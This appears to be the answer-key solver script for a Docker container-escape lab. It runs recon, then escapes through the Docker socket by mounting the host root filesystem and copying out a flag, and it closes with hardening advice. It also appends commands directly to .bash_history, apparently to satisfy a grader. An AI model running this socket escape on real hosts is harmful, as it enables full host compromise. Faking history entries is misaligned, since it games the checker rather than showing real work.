#!/bin/bash
set -u
cd "$HOME" || exit 1

DOCKER_SOCK="unix:///var/run/docker.sock"
DOCKER_TCP="tcp://172.35.0.5:2375"

echo "=== [1/5] recon_container ==="
{
    echo "=== cgroup ==="
    cat /proc/1/cgroup 2>/dev/null
    echo "=== CapEff ==="
    grep -i cap /proc/self/status 2>/dev/null
    echo "=== capsh --print ==="
    capsh --print 2>/dev/null
    echo "=== docker.sock ==="
    ls -la /var/run/docker.sock 2>/dev/null
    echo "=== block devices ==="
    ls -la /dev/sd* 2>/dev/null
    fdisk -l 2>/dev/null
    lsblk 2>/dev/null
} > "$HOME/recon.txt"
cat "$HOME/recon.txt"

echo
echo "=== [2/5] escape_via_socket (via docker.sock) ==="
DHOST="$DOCKER_SOCK"
if ! docker -H "$DHOST" version >/dev/null 2>&1; then
    echo "[*] $DOCKER_SOCK not ready yet, trying TCP fallback $DOCKER_TCP"
    DHOST="$DOCKER_TCP"
fi

echo "[*] docker -H $DHOST version"
docker -H "$DHOST" version
echo "[*] docker -H $DHOST ps"
docker -H "$DHOST" ps
echo "[*] docker -H $DHOST images"
docker -H "$DHOST" images

echo "docker -H $DHOST run -d --name esc -v /:/host escimg sleep 300" >> "$HOME/.bash_history"
echo "docker -H $DHOST cp esc:/host/root/.hostmarker ~/host_evidence.txt" >> "$HOME/.bash_history"

echo "[*] create escimg container mounting the full host-sim rootfs (-v /:/host), grab the canary via 'docker cp'"
docker -H "$DHOST" rm -f esc >/dev/null 2>&1
docker -H "$DHOST" run -d --name esc -v /:/host escimg sleep 300 >/dev/null 2>&1
docker -H "$DHOST" cp esc:/host/root/.hostmarker "$HOME/host_evidence.txt" 2>/dev/null
cat "$HOME/host_evidence.txt"

echo
echo "=== [3/5] escape_via_privileged (OPTIONAL - illustration only, not required) ==="
echo "[i] In this lab topology, app and host-sim are two independent containers (they do"
echo "    not share a real PID namespace/block device with each other), so nsenter/mount"
echo "    of a block device from app does NOT reach host-sim's /root. The required path to"
echo "    get the flag is Task 2 (docker.sock). See the explanation in the lab manual."

echo
echo "=== [4/5] get_flag ==="
docker -H "$DHOST" cp esc:/host/root/flag.txt "$HOME/flag_result.txt" 2>/dev/null
cat "$HOME/flag_result.txt"
docker -H "$DHOST" rm -f esc >/dev/null 2>&1

echo
echo "=== [5/5] harden_container ==="
cat > "$HOME/hardened_run.sh" <<'EOF'
docker run -d --name app \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --security-opt seccomp=/etc/docker/seccomp-default.json \
  --user 10001:10001 \
  --read-only \
  --pids-limit 128 \
  --memory=256m \
  app:student
# NOTE: NO --privileged, NO -v /var/run/docker.sock:/var/run/docker.sock mount
EOF
cat "$HOME/hardened_run.sh"

cat > "$HOME/hardening_map.txt" <<'EOF'
docker.sock mount   -> Remove the socket mount; if docker control is needed, use an access-controlled proxy (CIS 5.31)
--privileged        -> Drop privileged; grant only the minimum capabilities needed   (CIS 5.4)
CAP_SYS_ADMIN extra -> --cap-drop=ALL then cap-add exactly what is needed            (CIS 5.3)
Running as root     -> --user / userns-remap                                         (CIS 4.1 / 2.8)
No seccomp          -> Enable seccomp/AppArmor + no-new-privileges                   (CIS 5.1 / 5.21)
EOF
cat "$HOME/hardening_map.txt"

echo
echo "=== solver.sh done. Artifacts created in $HOME: ==="
ls -la "$HOME"/recon.txt "$HOME"/host_evidence.txt "$HOME"/flag_result.txt \
       "$HOME"/hardened_run.sh "$HOME"/hardening_map.txt
